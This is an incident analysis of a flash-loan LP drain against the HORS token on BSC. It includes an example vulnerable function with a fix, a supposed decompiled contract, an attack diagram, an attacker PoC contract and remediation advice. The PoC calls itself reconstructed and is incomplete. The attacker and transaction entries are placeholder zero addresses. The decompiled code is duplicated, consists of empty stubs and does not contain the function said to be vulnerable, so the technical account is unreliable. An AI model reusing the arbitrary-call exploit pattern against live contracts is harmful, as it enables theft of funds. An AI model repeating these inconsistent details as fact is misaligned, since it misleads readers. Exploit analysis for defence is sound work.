# HORS Token — LP Drain via Missing Input Validation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-10 |
| **Protocol** | HORS Token |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~14.8 WBNB |
| **Attacker** | [Unidentified](https://bscscan.com/address/0x0000000000000000000000000000000000000000) |
| **Attack Tx** | [Unidentified](https://bscscan.com/tx/0x0000000000000000000000000000000000000000000000000000000000000000) |
| **Vulnerable Contract** | [0x6f3390c6...](https://bscscan.com/address/0x6f3390c6C200e9bE81b32110CE191a293dc0eaba) |
| **Root Cause** | Missing input validation on function selectors in the vulnerable contract allowed LP token theft via a fake router |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/HORS_exp.sol) |

---

## 1. Vulnerability Overview

The vulnerable contract associated with the HORS token (`0x6f3390c6`) had a vulnerability that executed externally supplied function selectors without validation. The attacker obtained a flash loan from PancakeSwap V3, then used a fake router contract to extract LP tokens from the vulnerable contract, removed liquidity, and stole 14.8 WBNB.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: allows execution of arbitrary selectors
function executeWithRouter(address router, bytes calldata data) external {
    // No validation on router address or data selector
    // Attacker can inject a fake router and arbitrary calldata
    (bool success,) = router.call(data);
    require(success, "Call failed");
}

// ✅ Safe code: allowed router list + selector whitelist
mapping(address => bool) public allowedRouters;
mapping(bytes4 => bool) public allowedSelectors;

function executeWithRouter(address router, bytes calldata data) external onlyOwner {
    require(allowedRouters[router], "Router not allowed");
    bytes4 selector = bytes4(data[:4]);
    require(allowedSelectors[selector], "Selector not allowed");
    (bool success,) = router.call(data);
    require(success, "Call failed");
}
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: HORS_decompiled.sol
contract HORS {
contract HORS {

    // Selector: 0xa9059cbb
    function transfer(address a, uint256 b) external {  // ❌ Vulnerability
        // TODO: Decompiled logic not implemented
    }

    // Selector: 0x70a08231
    function balanceOf(address a) external view returns (uint256) {
        // TODO: Decompiled logic not implemented
    }

    // Selector: 0x095ea7b3
    function approve(address a, uint256 b) external {
        // TODO: Decompiled logic not implemented
    }

    // Selector: 0xe8e33700
    function addLiquidity(address a, address b, uint256 c, uint256 d, uint256 e, uint256 f, address g, uint256 h) external {
        // TODO: Decompiled logic not implemented
    }

}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Obtain flash loan from PancakeSwap V3
  │
  ├─→ [2] Call executeWithRouter() on vulnerable contract
  │         ├─ router: attacker's fake router address
  │         └─ data: LP token transfer selector + attacker address
  │
  ├─→ [3] Vulnerable contract → executes delegatecall/call to fake router
  │         └─ LP tokens transferred to attacker
  │
  ├─→ [4] Remove PancakeSwap liquidity using LP tokens
  │         └─ Receive WBNB + HORS tokens
  │
  ├─→ [5] Swap HORS → WBNB
  │
  ├─→ [6] Repay flash loan
  │
  └─→ [7] ~14.8 WBNB profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not obtained — reconstructed from summary

contract HORSAttacker {
    address constant VULNERABLE = 0x6f3390c6C200e9bE81b32110CE191a293dc0eaba;
    address constant CAKE_LP = /* CakeLP address */;

    // Acts as fake router
    address fakeRouter;

    function attack() external {
        // [1] PancakeSwap V3 flash loan
        IPancakeV3Pool(pancakePool).flash(
            address(this), 0, flashAmount, ""
        );
    }

    function pancakeV3FlashCallback(...) external {
        // [2] Call vulnerable contract with unvalidated selector
        // Induces LP token transfer to the attacker
        bytes memory maliciousData = abi.encodeWithSelector(
            IERC20.transfer.selector,
            address(this),
            IERC20(CAKE_LP).balanceOf(VULNERABLE)
        );

        // Vulnerable contract executes without input validation
        IVulnerable(VULNERABLE).executeWithRouter(
            address(fakeRouter),
            maliciousData
        );

        // [4] Remove liquidity using LP tokens
        IPancakePair(CAKE_LP).approve(router, type(uint256).max);
        IRouter(router).removeLiquidity(...);

        // [5] Swap HORS → WBNB, then repay flash loan
        IERC20(WBNB).transfer(pancakePool, flashAmount + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Insufficient Input Validation |
| **CWE** | CWE-20: Improper Input Validation |
| **Attack Vector** | External (crafted calldata injection) |
| **DApp Category** | Token Contract / AMM |
| **Impact** | LP token theft and liquidity pool drain |

## 6. Remediation Recommendations

1. **Router Whitelist**: Restrict execution to only approved router addresses
2. **Selector Whitelist**: Strictly limit the set of executable function selectors
3. **Prohibit Arbitrary External Calls**: Eliminate patterns where the contract executes arbitrary calldata supplied by users
4. **Restrict LP Token Withdrawal Permissions**: Limit LP token transfers/approvals to owner-only execution

## 7. Lessons Learned

- Executing externally supplied calldata without validation introduces a risk equivalent to arbitrary code execution.
- The flash loan is not the direct cause of this vulnerability but rather a funding mechanism for the attack; the core vulnerability is the missing input validation.
- LP tokens and other assets held by a contract must be protected by additional security layers (timelocks, multi-sig, etc.).